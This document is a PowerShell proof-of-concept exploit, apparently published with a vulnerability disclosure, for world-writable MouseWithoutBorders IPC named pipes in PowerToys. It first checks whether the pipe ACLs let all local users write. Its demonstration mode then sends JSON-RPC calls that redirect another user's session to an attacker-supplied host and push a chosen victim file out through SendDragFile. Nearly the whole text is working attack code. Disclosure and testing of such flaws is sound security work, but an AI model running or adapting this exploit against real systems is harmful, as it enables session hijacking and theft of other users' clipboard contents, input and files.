<#
    CarbonBlue - PoC for CVE-2026-83681
    MouseWithoutBorders world-writable IPC named pipes (CWE-732)

    PowerToys MouseWithoutBorders creates its IPC named pipes with a DACL granting
    ReadWrite | CreateNewInstance to NT AUTHORITY\Authenticated Users (every logged-on
    user) instead of the pipe owner's SID. Any standard local account can therefore
    connect to another user's MWB IPC pipes and reach the exposed JSON-RPC surface
    (ConnectToMachine / SendDragFile / SendClipboardData) - redirecting the victim's
    session to an attacker host and carbon-copying their clipboard, keystrokes and files.

    Run as a standard user while MWB runs under a DIFFERENT account.

    Target : PowerToys MouseWithoutBorders <= v0.100.2 (and main HEAD ddc536c69)
    Author : 2alf
    License: MIT -- authorized security research only.
#>

[CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]
param(
    [int]$ConnectTimeoutMs = 3000,
    [int]$RpcTimeoutMs     = 5000,

    [switch]$Demonstrate,
    [string]$AttackerHost,
    [string]$SecurityKey,
    [string]$FilePath,       # demo file exfil via SendDragFile
    [switch]$Force
)

$ErrorActionPreference = 'Stop'

$Pipes = [ordered]@{
    SettingsSync    = 'MouseWithoutBorders/SettingsSync'
    ClipboardHelper = 'MouseWithoutBorders/ClipboardHelper'
}

function Test-MwbPipe {
    param([string]$PipeName)

    $r = [ordered]@{ Pipe = $PipeName; Connected = $false; Vulnerable = $false; Rules = @(); Error = $null }
    $pipe = $null
    try {
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(
            '.', $PipeName,
            [System.IO.Pipes.PipeDirection]::InOut,
            [System.IO.Pipes.PipeOptions]::Asynchronous)

        $pipe.Connect($ConnectTimeoutMs)
        $r.Connected = $true

        $acl = $pipe.GetAccessControl()
        foreach ($rule in $acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
            $r.Rules += ('{0} : {1} : {2}' -f $rule.IdentityReference, $rule.PipeAccessRights, $rule.AccessControlType)

            $isAuthUsers = $rule.IdentityReference.Value -match 'Authenticated Users'
            $hasWrite    = ($rule.PipeAccessRights -band [System.IO.Pipes.PipeAccessRights]::ReadWrite) -ne 0
            $isAllow     = $rule.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Allow
            if ($isAuthUsers -and $hasWrite -and $isAllow) { $r.Vulnerable = $true }
        }
    }
    catch [System.UnauthorizedAccessException] { $r.Error = 'Access denied (ACL correctly scoped to owner).' }
    catch [System.TimeoutException]            { $r.Error = 'Timed out - pipe absent (is MouseWithoutBorders running?).' }
    catch                                      { $r.Error = $_.Exception.Message }
    finally                                    { if ($pipe) { $pipe.Dispose() } }

    [pscustomobject]$r
}

function Invoke-MwbRpc {
    param(
        [string]$PipeName,
        [string]$Method,
        [object[]]$Params,
        [int]$Id = 1
    )

    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(
        '.', $PipeName, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::Asynchronous)
    try {
        $pipe.Connect($ConnectTimeoutMs)

        $paramsJson = '[' + (($Params | ForEach-Object { ConvertTo-Json $_ -Compress }) -join ',') + ']'
        $json = '{"jsonrpc":"2.0","id":' + $Id + ',"method":' + (ConvertTo-Json $Method -Compress) + ',"params":' + $paramsJson + '}'

        $body   = [System.Text.Encoding]::UTF8.GetBytes($json)
        $header = [System.Text.Encoding]::ASCII.GetBytes("Content-Length: $($body.Length)`r`n`r`n")
        $pipe.Write($header, 0, $header.Length)
        $pipe.Write($body,   0, $body.Length)
        $pipe.Flush()

        $buf = New-Object byte[] 65536
        $iar = $pipe.BeginRead($buf, 0, $buf.Length, $null, $null)
        if ($iar.AsyncWaitHandle.WaitOne($RpcTimeoutMs)) {
            $n = $pipe.EndRead($iar)
            if ($n -gt 0) { return [System.Text.Encoding]::UTF8.GetString($buf, 0, $n) }
            return '<server closed the pipe with no response>'
        }
        return '<no response within RpcTimeoutMs>'
    }
    finally { $pipe.Dispose() }
}

###############
###############
###############

Write-Host ''
Write-Host 'CarbonBlue - CVE-2026-83681' -ForegroundColor Cyan
Write-Host ("Running as: {0}\{1}" -f $env:USERDOMAIN, $env:USERNAME)
Write-Host ''

$findings = foreach ($name in $Pipes.Values) { Test-MwbPipe -PipeName $name }

foreach ($f in $findings) {
    if ($f.Connected) {
        Write-Host ("[+] CONNECTED  {0}" -f $f.Pipe) -ForegroundColor Green
        foreach ($line in $f.Rules) { Write-Host ("    {0}" -f $line) }
        if ($f.Vulnerable) {
            Write-Host '    >> VULNERABLE: Authenticated Users has ReadWrite on this pipe.' -ForegroundColor Red
        } else {
            Write-Host '    >> ACL does not grant Authenticated Users ReadWrite.' -ForegroundColor Yellow
        }
    } else {
        Write-Host ("[-] DENIED     {0} ({1})" -f $f.Pipe, $f.Error) -ForegroundColor Yellow
    }
    Write-Host ''
}

$vuln  = ($findings | Where-Object Vulnerable).Count
$total = $findings.Count

if (-not $Demonstrate) {
    if ($vuln -gt 0) {
        Write-Host ("RESULT: VULNERABLE ({0}/{1} pipes expose IPC to all local users)" -f $vuln, $total) -ForegroundColor Red
        Write-Host 'Re-run with -Demonstrate -AttackerHost <pc> -SecurityKey <key> to demonstrate the redirect (lab only).' -ForegroundColor DarkGray
        exit 1
    } else {
        Write-Host 'RESULT: NOT VULNERABLE (no MWB pipe grants Authenticated Users ReadWrite)' -ForegroundColor Green
        exit 0
    }
}

if (-not $AttackerHost -or -not $SecurityKey) {
    throw '-Demonstrate requires both -AttackerHost and -SecurityKey.'
}
if ($vuln -eq 0) {
    Write-Host 'Pipes are not exposed on this host; nothing to exploit. Aborting.' -ForegroundColor Yellow
    exit 0
}

Write-Host ''
Write-Host '*** DEMONSTRATION MODE ***' -ForegroundColor Red
Write-Host 'This will hijack the live MouseWithoutBorders session. Lab / authorized use only.' -ForegroundColor Red

$target = "$AttackerHost (redirect victim's MWB; key overwrite)"
if ($Force -or $PSCmdlet.ShouldProcess($target, 'ConnectToMachine - redirect victim MouseWithoutBorders to attacker host')) {

    Write-Host ("[*] ConnectToMachine('{0}', '<key>') -> SettingsSync" -f $AttackerHost) -ForegroundColor Magenta
    $resp = Invoke-MwbRpc -PipeName $Pipes.SettingsSync -Method 'ConnectToMachine' -Params @($AttackerHost, $SecurityKey)
    Write-Host ("    response: {0}" -f $resp)

    if ($FilePath) {
        Write-Host ("[*] SendDragFile('{0}') -> ClipboardHelper (exfil as victim)" -f $FilePath) -ForegroundColor Magenta
        $resp2 = Invoke-MwbRpc -PipeName $Pipes.ClipboardHelper -Method 'SendDragFile' -Params @($FilePath)
        Write-Host ("    response: {0}" -f $resp2)
    }

    Write-Host ''
    Write-Host 'RESULT: DEMONSTRATION sent. Victim MWB should now be pointed at the attacker host.' -ForegroundColor Red
    exit 1
} else {
    Write-Host 'Aborted by operator (no RPC sent).' -ForegroundColor Yellow
    exit 0
}
